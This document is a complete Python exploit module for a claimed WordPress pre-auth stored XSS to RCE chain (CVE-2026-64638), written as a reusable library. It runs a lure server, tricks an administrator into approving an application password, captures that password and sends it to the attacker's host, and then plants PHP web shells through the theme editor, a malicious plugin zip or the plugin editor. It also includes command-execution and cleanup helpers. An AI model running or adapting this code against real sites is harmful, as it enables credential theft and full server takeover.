# -*- coding: utf-8 -*-
# CVE-2026-64638 — WordPress < 7.0.3 Pre-Auth Stored XSS -> RCE
# Requires victim interaction. Function blocks up to `wait_timeout` seconds.
# Function-only refactor. No import side-effects.
# Usage:
#     from function.cve_2026_64638 import exploit, run, cleanup
#     r = exploit('http://target.com', command='id', wait_timeout=120)
#     if r['exploited']:
#         print(r['output'])
# Coded by wordsec.net — refactored
import base64
import html
import io
import json
import secrets
import socket
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
import zipfile
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

CVE_ID = 'CVE-2026-64638'
DEFAULT_TIMEOUT = 20
UA = 'xss2shell/refactor'
PLUGIN_SLUG = 'xss2shell'
APP_NAME = 'XSS2Shell-PoC-Wordsec'


# ────────────── HTTP helpers ──────────────
def _http_get(url, timeout=DEFAULT_TIMEOUT):
    req = urllib.request.Request(url, headers={"User-Agent": UA})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return None, str(e)


def _http_json(url, data=None, headers=None, method=None, timeout=DEFAULT_TIMEOUT):
    h = dict(headers or {})
    h.setdefault("User-Agent", UA)
    req = urllib.request.Request(
        url,
        data=(json.dumps(data).encode() if data is not None else None),
        headers=h, method=method,
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return json.loads(r.read().decode())
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "replace")
        try:
            return json.loads(body)
        except Exception:
            return {"_http_error": e.code, "_body": body[:500]}
    except Exception as e:
        return {"_exception": str(e)}


def _basic_auth(user, password):
    token = base64.b64encode(f"{user}:{password}".encode()).decode()
    return {"Authorization": f"Basic {token}", "Content-Type": "application/json"}


def _shell_alive(shell_url, timeout=DEFAULT_TIMEOUT):
    try:
        r = _http_json(shell_url + "?cmd=" + urllib.parse.quote("id"), timeout=timeout)
        return bool(r.get("rce"))
    except Exception:
        return False


def _get_lan_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


# ────────────── payload ──────────────
XSS_PAYLOAD = (
    "< area id=ajaxurl href=/?rest_route=/&_method=GET"
    "&_jsonp=window.opener.approve.click&_envelope=1>"
    "< div id=color-picker class=reset-pass-submit>"
    '< button class="wp-generate-pw color-option">X'
)


# ────────────── page builders ──────────────
def _build_opener(origin, site, success_url, app_id, delay_ms):
    value = html.escape(XSS_PAYLOAD, quote=True)
    return f"""<!doctype html>
<html><head><meta charset="utf-8"><title>xss2shell</title></head>
<body><script>
(function () {{
  var ORIGIN = {origin!r};
  var SITE = {site!r};
  var SUCCESS = {success_url!r};
  var APP_ID = {app_id!r};
  var APP_NAME = {APP_NAME!r};
  var LOG_VALUE = {value!r};
  var DELAY = {delay_ms};
  function beacon(k, v) {{
    new Image().src = ORIGIN + '/beacon?step=' + encodeURIComponent(k)
      + '&msg=' + encodeURIComponent(v || '');
  }}
  function run() {{
    beacon('opener_loaded');
    var child = null;
    try {{ child = window.open('about:blank', 'xss2child'); }} catch (e) {{}}
    if (!child) {{ beacon('popup_blocked'); return; }}
    try {{ child.location.href = ORIGIN + '/child'; beacon('child_written'); }}
    catch (e) {{ beacon('child_error', String(e)); }}
    location.href = SITE + '/wp-admin/authorize-application.php'
      + '?app_name=' + encodeURIComponent(APP_NAME)
      + '&app_id=' + APP_ID
      + '&success_url=' + encodeURIComponent(SUCCESS);
  }}
  run();
}})();
</script></body></html>"""


def _build_child(origin, site, delay_ms):
    value = html.escape(XSS_PAYLOAD, quote=True)
    return f"""<!doctype html>
<html><head><meta charset="utf-8"><title>xss2shell - child</title></head>
<body>
<form id="f" method="post" action="{site}/wp-login.php">
  <input type="hidden" name="log" value="{value}">
  <input type="hidden" name="pwd" value="x">
</form>
<script>
(function () {{
  var ORIGIN = {origin!r};
  var DELAY = {delay_ms};
  function b(k,v) {{
    new Image().src = ORIGIN + '/beacon?step=' + encodeURIComponent(k)
      + '&msg=' + encodeURIComponent(v || '');
  }}
  b('child_ready');
  setTimeout(function () {{ b('submit_sent'); document.getElementById('f').submit(); }}, DELAY);
}})();
</script></body></html>"""


def _build_callback(origin, site, fallback=None):
    nonce_fn = (
        "function findNonce(h,fname){"
        "var needle='name=\"'+fname+'\"';var i=h.indexOf(needle);"
        "if(i===-1)return null;var ts=h.lastIndexOf('<',i);"
        "if(ts===-1)return null;var te=h.indexOf('>',i);"
        "if(te===-1||te>i+300)return null;"
        "var tag=h.substring(ts,te+1);var vi=tag.indexOf('value=\"');"
        "if(vi===-1)return null;var vs=vi+7;var ve=tag.indexOf('\"',vs);"
        "if(ve===-1||ve>vs+20)return null;return tag.substring(vs,ve);}"
    )
    ta_fn = (
        "function getTA(h){var d=(new DOMParser()).parseFromString(h,'text/html');"
        "var t=d.getElementById('newcontent');return t?t.value:null;}"
    )
    webshell = (
        "\\nif(isset($_GET[\\\"xss2shell_cmd\\\"])){"
        "header(\\\"Content-Type:application/json\\\");"
        "echo json_encode(array(\\\"rce\\\"=>true,\\\"output\\\"=>shell_exec($_GET[\\\"xss2shell_cmd\\\"])));"
        "exit;}"
    )
    js = (
        "(async function(){"
        f"var B='{origin}';var ZIP='{origin}/payload.zip';"
        "function b(k,v){new Image().src=B+'/beacon?step='+encodeURIComponent(k)+'&msg='+encodeURIComponent(v||'');}"
        + nonce_fn + ta_fn +
        "try{"
        "b('upload_started');var ok=false;"
        # theme editor
        "try{var te=await(await fetch('/wp-admin/theme-editor.php?file=functions.php',{credentials:'same-origin'})).text();"
        "var nn=findNonce(te,'nonce');var ct=getTA(te);"
        "var ti=te.indexOf('name=\"theme\"');var th=null;"
        "if(ti>=0){var tv=te.indexOf('value=\"',ti);if(tv>=0){var ts=tv+7;var te2=te.indexOf('\"',ts);th=te.substring(ts,te2);}}"
        "if(nn&&ct!==null){var sh='" + webshell + "';"
        "if(ct.indexOf('xss2shell_cmd')===-1)ct+=sh;"
        "var tp=new URLSearchParams();tp.append('nonce',nn);"
        "tp.append('_wp_http_referer','/wp-admin/theme-editor.php?file=functions.php');"
        "tp.append('newcontent',ct);tp.append('action','update');"
        "tp.append('file','functions.php');tp.append('theme',th||'twentytwentyfour');"
        "var r2=await fetch('/wp-admin/theme-editor.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:tp.toString(),credentials:'same-origin'});"
        "var rt=await r2.text();"
        "if(rt.indexOf('File edited successfully')!==-1||r2.url.indexOf('a=1')!==-1){ok=true;b('upload_result','THEME_EDITOR_OK');}"
        "else{b('te_fail','status:'+r2.status);}"
        "}else{b('te_missing','nonce:'+(nn||'null'));}}catch(e1){b('te_err',String(e1));}"
        # plugin zip
        "if(!ok){try{var zip=await(await fetch(ZIP)).arrayBuffer();"
        "var ph=await(await fetch('/wp-admin/plugin-install.php?tab=upload',{credentials:'same-origin'})).text();"
        "var pn=findNonce(ph,'_wpnonce');"
        "if(pn){var fd=new FormData();fd.append('_wpnonce',pn);"
        "fd.append('_wp_http_referer','/wp-admin/plugin-install.php?tab=upload');"
        "fd.append('install-plugin-submit','Install Now');"
        "fd.append('pluginzip',new File([zip],'xss2shell.zip',{type:'application/zip'}));"
        "var rp=await fetch('/wp-admin/update.php?action=upload-plugin',{method:'POST',body:fd,credentials:'same-origin'});"
        "var rt2=await rp.text();"
        "if(rt2.indexOf('successfully installed')!==-1||rt2.indexOf('Plugin installed')!==-1){ok=true;b('upload_result','PLUGIN_OK');}"
        "else{b('pi_fail','status:'+rp.status);}}}catch(e2){b('pi_err',String(e2));}}"
        # plugin editor
        "if(!ok){var pl=[{p:'hello.php',f:'hello.php',s:'hello'}];"
        "for(var i=0;pl.length>i;i++){if(ok)break;try{var pg=pl[i];"
        "var pe=await(await fetch('/wp-admin/plugin-editor.php?plugin='+encodeURIComponent(pg.p)+'&file='+encodeURIComponent(pg.f),{credentials:'same-origin'})).text();"
        "var pn2=findNonce(pe,'nonce');var pc=getTA(pe);"
        "if(pn2&&pc!==null){var sh3='" + webshell + "';"
        "if(pc.indexOf('xss2shell_cmd')===-1)pc+=sh3;"
        "var pp=new URLSearchParams();pp.append('nonce',pn2);"
        "pp.append('_wp_http_referer','/wp-admin/plugin-editor.php?plugin='+encodeURIComponent(pg.p)+'&file='+encodeURIComponent(pg.f));"
        "pp.append('newcontent',pc);pp.append('action','update');"
        "pp.append('file',pg.f);pp.append('plugin',pg.p);"
        "var r3=await fetch('/wp-admin/plugin-editor.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:pp.toString(),credentials:'same-origin'});"
        "var rt3=await r3.text();"
        "if(rt3.indexOf('File edited successfully')!==-1||r3.url.indexOf('a=1')!==-1){ok=true;b('upload_result','PLUGIN_EDITOR_OK:'+pg.p);}"
        "}}catch(e3){b('pe_err',pg.p+' '+String(e3));}}}"
        "if(!ok)b('upload_result','ALL_FAILED');else b('upload_result','SHELL_READY');"
        "}catch(e){b('upload_result','ERR:'+e);}})();"
    )
    head = "<script>" + js + "</scr" + "ipt>"
    if fallback:
        fb = f"var FALLBACK={json.dumps(fallback)};\n"
        u = "var user=qs.get('user_login')||(FALLBACK&&FALLBACK.user_login);"
        p = "var pass=qs.get('password')||(FALLBACK&&FALLBACK.password);"
    else:
        fb, u, p = "", "var user=qs.get('user_login');", "var pass=qs.get('password');"
    return f"""<!doctype html>
<html><head><meta charset="utf-8"><title>xss2shell - callback</title></head>
<body><script>
(function () {{
  var ORIGIN = {origin!r};
  var site = {site!r};
  var qs = new URLSearchParams(location.search);
  {fb}{u}{p}
  function beacon(k,v) {{ new Image().src = ORIGIN + '/beacon?step=' + encodeURIComponent(k) + '&msg=' + encodeURIComponent(v||''); }}
  if (!pass) {{ document.body.textContent = 'no application password captured'; beacon('publish_error','no password'); return; }}
  var content = {json.dumps(head)};
  fetch(site + '/wp-json/wp/v2/pages', {{
    method: 'POST',
    headers: {{ 'Authorization': 'Basic ' + btoa(user+':'+pass), 'Content-Type': 'application/json' }},
    body: JSON.stringify({{ title: 'xss2shell-' + Date.now(), status: 'publish', content: content }})
  }}).then(function(r){{return r.json();}}).then(function(obj){{
    if (obj && obj.link) {{
      beacon('publish_ok', obj.link);
      beacon('page_id', String(obj.id));
      location.href = obj.link;
    }} else {{
      document.body.textContent = 'publish failed: ' + JSON.stringify(obj);
      beacon('publish_error', JSON.stringify(obj));
    }}
  }}).catch(function(e){{ beacon('publish_error', String(e)); }});
}})();
</script></body></html>"""


def _build_plugin_zip():
    main_php = "<?php\n/**\n * Plugin Name: XSS2Shell PoC\n * Version: 1.0.0\n */\n"
    shell_php = ("<?php\nif(isset($_REQUEST['cmd'])){"
                 "header('Content-Type: application/json');"
                 "echo json_encode(['rce'=>true,'output'=>shell_exec($_REQUEST['cmd'])]);"
                 "exit;}\nhttp_response_code(404);\n")
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr(f"{PLUGIN_SLUG}/{PLUGIN_SLUG}.php", main_php)
        z.writestr(f"{PLUGIN_SLUG}/shell.php", shell_php)
    return buf.getvalue()


# ────────────── server-side RCE fallback ──────────────
def _server_side_rce(site, user_login, password, timeout=DEFAULT_TIMEOUT):
    auth = _basic_auth(user_login, password)
    webshell = ("\nif(isset($_GET['xss2shell_cmd'])){"
                "header('Content-Type:application/json');"
                "echo json_encode(array('rce'=>true,'output'=>shell_exec($_GET['xss2shell_cmd'])));"
                "exit;}\n")
    try:
        _http_json(site + "/wp-json/wp/v2/plugins",
                   data={"slug": "starter-templates", "status": "active"},
                   headers=auth, timeout=timeout)
    except Exception:
        pass
    try:
        req = urllib.request.Request(
            site + "/wp-admin/theme-editor.php?file=functions.php",
            headers={"User-Agent": UA, "Authorization": auth["Authorization"]},
        )
        with urllib.request.urlopen(req, timeout=timeout) as r:
            page = r.read().decode("utf-8", "replace")
            nonce = _extract_field(page, 'name="nonce"')
            content = _extract_textarea(page, "newcontent")
            theme = _extract_field(page, 'name="theme"')
            if nonce and content is not None:
                if "xss2shell_cmd" not in content:
                    content += webshell
                data = urllib.parse.urlencode({
                    "nonce": nonce,
                    "_wp_http_referer": "/wp-admin/theme-editor.php?file=functions.php",
                    "newcontent": content, "action": "update",
                    "file": "functions.php", "theme": theme or "twentytwentyfour",
                }).encode()
                req2 = urllib.request.Request(
                    site + "/wp-admin/theme-editor.php", data=data,
                    headers={"User-Agent": UA, "Authorization": auth["Authorization"],
                             "Content-Type": "application/x-www-form-urlencoded"},
                )
                with urllib.request.urlopen(req2, timeout=timeout) as r2:
                    resp = r2.read().decode("utf-8", "replace")
                    if "File edited successfully" in resp or "updated=true" in r2.url:
                        return True
    except Exception:
        pass
    return False


def _extract_field(h, needle):
    i = h.find(needle)
    if i == -1:
        return None
    vi = h.find('value="', max(0, i - 200), i + 200)
    if vi == -1:
        vi = h.find('value="', i)
    if vi == -1:
        return None
    s = vi + 7
    e = h.find('"', s)
    if e == -1 or e > s + 50:
        return None
    return h[s:e]


def _extract_textarea(h, element_id):
    marker = f'id="{element_id}"'
    i = h.find(marker)
    if i == -1:
        return None
    s = h.find('>', i) + 1
    e = h.find('</textarea>', s)
    return h[s:e] if e != -1 else None


# ────────────── server (per-exploit instance) ──────────────
class _State:
    def __init__(self):
        self.site = None
        self.origin = None
        self.success_url = None
        self.app_id = None
        self.delay_ms = 3000
        self.steps = []
        self.step_set = set()
        self.captured = None
        self.published = None
        self.shell_method = None

    def set_step(self, name, msg=""):
        if name not in self.step_set:
            self.step_set.add(name)
            self.steps.append((name, msg))


def _make_handler(state):
    class Handler(BaseHTTPRequestHandler):
        server_version = "xss2shell"
        def log_message(self, *a): pass
        def _reply(self, code, body, ctype="text/plain"):
            self.send_response(code)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(body)
        def do_GET(self):
            p = urllib.parse.urlparse(self.path)
            q = urllib.parse.parse_qs(p.query)
            if p.path == "/":
                self._reply(200, _build_opener(state.origin, state.site,
                                              state.success_url, state.app_id,
                                              state.delay_ms).encode(), "text/html")
            elif p.path == "/child":
                self._reply(200, _build_child(state.origin, state.site,
                                              state.delay_ms).encode(), "text/html")
            elif p.path == "/callback":
                qp = q.get("password", [""])[0]
                if qp:
                    state.captured = {
                        "site_url": q.get("site_url", [""])[0],
                        "user_login": q.get("user_login", [""])[0],
                        "password": qp,
                    }
                    state.set_step("password_captured",
                                   f"user={state.captured['user_login']}")
                    threading.Thread(
                        target=_server_side_rce,
                        args=(state.site, state.captured["user_login"],
                              state.captured["password"]),
                        daemon=True,
                    ).start()
                self._reply(200, _build_callback(state.origin, state.site,
                                                 state.captured).encode(), "text/html")
            elif p.path == "/beacon":
                name = q.get("step", [""])[0]
                msg = q.get("msg", [""])[0]
                if name == "publish_ok":
                    state.published = {"link": msg}
                elif name == "page_id":
                    state.published = dict(state.published or {}, id=msg)
                state.set_step(name, msg)
                self._reply(200, b"ok")
            elif p.path == "/payload.zip":
                body = _build_plugin_zip()
                self.send_response(200)
                self.send_header("Content-Type", "application/zip")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
            elif p.path == "/state":
                self._reply(200, json.dumps({
                    "steps": state.steps,
                    "captured": state.captured,
                    "published": state.published,
                }).encode(), "application/json")
            else:
                self._reply(404, b"not found")
    return Handler


# ────────────── public helpers ──────────────
def run(shell_url, cmd, timeout=DEFAULT_TIMEOUT):
    """Execute command via deployed shell. Return stdout string."""
    sep = "?" if "?" not in shell_url else "&"
    if "cmd=" in shell_url or "xss2shell_cmd=" in shell_url:
        base = shell_url.split("=")[0] + "="
        url = base + urllib.parse.quote(cmd)
    else:
        url = shell_url + sep + "cmd=" + urllib.parse.quote(cmd)
    r = _http_json(url, timeout=timeout)
    return (r.get("output") or "").strip() if r.get("rce") else ""


def cleanup(site, captured, published, timeout=DEFAULT_TIMEOUT):
    """Delete published page. Return True on success."""
    if not captured or not published or not published.get("id"):
        return False
    headers = _basic_auth(captured["user_login"], captured["password"])
    try:
        _http_json(f"{site}/wp-json/wp/v2/pages/{published['id']}?force=true",
                   method="DELETE", headers=headers, timeout=timeout)
        return True
    except Exception:
        return False


# ────────────── PUBLIC FUNCTION ──────────────
def exploit(target_url, command='id', lhost=None, lport=0,
            wait_timeout=120, cleanup_after=False, debug=False,
            timeout=DEFAULT_TIMEOUT):
    """
    Exploit CVE-2026-64638 (WordPress < 7.0.3 Pre-Auth XSS -> RCE).

    ⚠ BLOKIR sampai admin klik lure URL atau wait_timeout habis.

    Args:
        target_url   : str  — 'http://target.com'
        command      : str  — command untuk eksekusi setelah shell ready
        lhost        : str  — IP LAN attacker (None = auto-detect)
        lport        : int  — port (0 = random)
        wait_timeout : int  — max tunggu admin klik (default 120s)
        cleanup_after: bool — hapus published page setelah exploit
        debug        : bool — collect log
        timeout      : int  — per-request timeout

    Returns:
        dict — standard contract + shell_method
    """
    res = {
        'target': target_url,
        'cve': CVE_ID,
        'plugin': 'wordpress core',
        'endpoint': None,
        'http_status': None,
        'vulnerable': False,
        'rce_verified': 'NO',
        'output': '',
        'shell_url': '',
        'marker': '',
        'detail': '',
        'exploited': False,
        'log': [],
        'shell_method': None,
    }
    log = res['log']

    def _step(msg):
        if debug:
            log.append(msg)

    site = target_url.strip().rstrip('/')
    if not site:
        res['detail'] = 'empty target'
        return res
    if not site.startswith(('http://', 'https://')):
        site = 'http://' + site
    res['target'] = site

    # 1. wp-login check
    try:
        status, body = _http_get(site + '/wp-login.php', timeout)
    except Exception as e:
        res['detail'] = f'wp-login unreachable: {e}'
        return res
    if status != 200 or 'user_login' not in body:
        res['detail'] = f'not a WordPress login (HTTP {status})'
        return res
    _step('wp-login reachable')

    # 2. bind server
    state = _State()
    state.site = site
    state.app_id = str(uuid.uuid4())

    if lhost and lhost != '0.0.0.0':
        bind_host = lan_ip = lhost
    else:
        bind_host = '0.0.0.0'
        lan_ip = _get_lan_ip()

    try:
        srv = ThreadingHTTPServer((bind_host, lport), _make_handler(state))
    except OSError as e:
        res['detail'] = f'cannot start server: {e}'
        return res

    _, port = srv.server_address
    state.origin = f'http://{lan_ip}:{port}'
    state.success_url = f'http://{lan_ip}:{port}/callback'
    res['endpoint'] = state.origin + '/'
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    _step(f'listening on {lan_ip}:{port}')

    deadline = time.time() + wait_timeout
    shell_url_candidate = site + f'/wp-content/plugins/{PLUGIN_SLUG}/shell.php'
    got_shell = False
    shell_final = ''
    method_final = None

    try:
        # 3. wait loop
        while time.time() < deadline:
            time.sleep(0.5)
            method = state.shell_method
            if method == 'plugin' and _shell_alive(shell_url_candidate, timeout):
                got_shell = True
                shell_final = shell_url_candidate
                method_final = 'plugin'
                break
            elif method == 'theme':
                try:
                    r = _http_json(f"{site}/?xss2shell_cmd=id", timeout=timeout)
                    if r.get('rce'):
                        got_shell = True
                        shell_final = f'{site}/?xss2shell_cmd='
                        method_final = 'theme'
                        break
                except Exception:
                    pass
            elif method == 'plugin_editor':
                try:
                    base = f'{site}/wp-content/plugins/basic-auth/basic-auth.php'
                    r = _http_json(f'{base}?xss2shell_cmd=id', timeout=timeout)
                    if r.get('rce'):
                        got_shell = True
                        shell_final = f'{base}?xss2shell_cmd='
                        method_final = 'plugin_editor'
                        break
                except Exception:
                    pass
            elif method is not None:
                break
            # early exit: password captured tapi shell belum ready
            if state.captured and not method:
                state.shell_method = 'theme'   # coba theme fallback

        # 4. result
        names = {s[0] for s in state.steps}
        if got_shell:
            res['vulnerable'] = True
            res['exploited'] = True
            res['rce_verified'] = 'YES'
            res['shell_url'] = shell_final
            res['shell_method'] = method_final
            try:
                res['output'] = run(shell_final, command, timeout)[:300]
            except Exception:
                pass
            res['detail'] = f'RCE via {method_final}'
        else:
            if 'opener_loaded' not in names:
                res['detail'] = 'admin never visited the lure (wait_timeout expired)'
            elif 'password_captured' not in names:
                res['detail'] = 'XSS failed (target may be patched >= 7.0.3)'
            else:
                res['detail'] = 'password captured but shell deploy failed'
            res['shell_method'] = state.shell_method

        # 5. cleanup
        if cleanup_after and state.captured and state.published:
            if cleanup(site, state.captured, state.published, timeout):
                _step('published page deleted')

        return res
    finally:
        try:
            srv.shutdown()
        except Exception:
            pass